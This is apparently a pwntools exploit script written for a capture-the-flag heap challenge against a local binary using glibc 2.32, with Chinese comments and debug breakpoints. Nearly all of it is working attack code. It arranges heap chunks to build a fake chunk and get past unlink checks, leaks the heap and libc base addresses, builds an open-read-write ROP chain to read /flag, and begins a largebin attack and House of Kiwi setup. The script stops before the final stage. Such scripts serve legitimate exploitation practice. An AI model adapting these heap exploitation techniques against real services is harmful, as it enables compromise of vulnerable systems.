from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.32.so')
elf = ELF('./main')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./main')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3b2e,0xe3b31,0xe3b34]

def new(size,Content=b'\n'):
    io.sendlineafter(b">>",str(1).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"(: Size: ",str(size).encode())
    io.sendafter(b"Content:",Content)

def delete(idx):
    io.sendlineafter(b">>",str(3).encode())
    io.sendlineafter(b"Index:",str(idx).encode())

def show(idx):
    io.sendlineafter(b">>",str(4).encode())
    io.sendlineafter(b"Index:",str(idx).encode())

def modify(idx,Content):
    io.sendlineafter(b">>",str(2).encode())
    io.sendlineafter(b"Index:",str(idx).encode())
    io.sendafter(b"Content:",Content)

new(0x448) # 0x418 idx = 0 c
new(0x448) #  idx = 1 prev
new(0x418) #  idx = 2 victim 
#p()
new(0x108) # padding 
new(0x418) # idx = 4 a 
new(0x108) # padding
new(0x428) # idx = 6 b
new(0x108,p64(0x13f0) * 0x21) # padding idx = 7
delete(4)
delete(1) # delete a,prev,b
delete(6)
delete(0) # delete c
payload = b'\x00' * 0x440 + p64(0) + p64(0x13f1)
new(0x478,payload) # idx = 0 设置fake chunk
# bypass unlink
#p() # 看malloc(0x418)是哪个
new(0x418) # idx = 1 拿到remainder
new(0x418) # idx = 4 a
new(0x428) # idx = 6 b
## set a->bk and b->fd
delete(4)
delete(1)
delete(6)
new(0x418,b'\x00'*9) # idx = 1 a
new(0x4f0) # idx = 4 b,remain 进largebin
new(0x428) # idx = 6 b
payload = p64(0) * 0x20 + p64(0x13f0) + b'\x00'
modify(7,payload)

new(0x500) # idx = 8防止fakechunk 跟top合并
#p() # 看还有哪些指针可以使用
delete(4) # unlink

# leak heap and libc
show(6)
heap_base = u64(io.recvuntil(b'\x31')[-7:-1].ljust(8,b'\x00')) - 0x1080
success("heap_base -->" + hex(heap_base))
new(0x448) # idx = 4 [0x700, 0xb50]
new(0x1600) # idx = 9
show(2)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1e4240
success("libc_base -->" + hex(libc_base)) 
#p()

# orw
orw_addr = heap_base + 0x2b0
flag_addr =heap_base + 0x3b0
flag_strings_addr = flag_addr
pop_rdi_ret = libc_base + 0x000000000002858f
pop_rsi_ret = libc_base + 0x000000000002ac3f
pop_rdx_r12_ret = libc_base + 0x0000000000114161 # pop rdx ; pop r12 ; ret
open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
puts_addr = libc_base + libc.symbols['puts']
orw_chain = flat(
        pop_rdi_ret , flag_strings_addr , pop_rsi_ret , 0 , open_addr ,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_r12_ret , 0x100 , 0 , read_addr ,
        pop_rdi_ret , flag_addr , puts_addr).ljust(0x100,b'\x00') + b'/flag\x00'

# set house of kiwi
IO_file_jumps = 0
IO_helper_jumps = 0
setcontext_addr = libc_base + libc.symbols['setcontext']
ret_addr = libc_base + 0x0000000000026699
TLS = libc_base + 0x1eb578

# largebin attack
new(0x418) # idx = 10 p2 remain拿出来
delete(7)
p()
payload = p64(0x41) * 0x20 + p64(0x110)
new(0x108,payload) # 修改idx = 7 ->nextchunk->prevsize 为0x110，使得delete(6)时向下合并不会出错
p()
delete(6) # delete p1
delete(9)
new(0x1600) # p1进largebin
p() # 看malloc多少从0xb50到b,确定payload


io.interactive()



















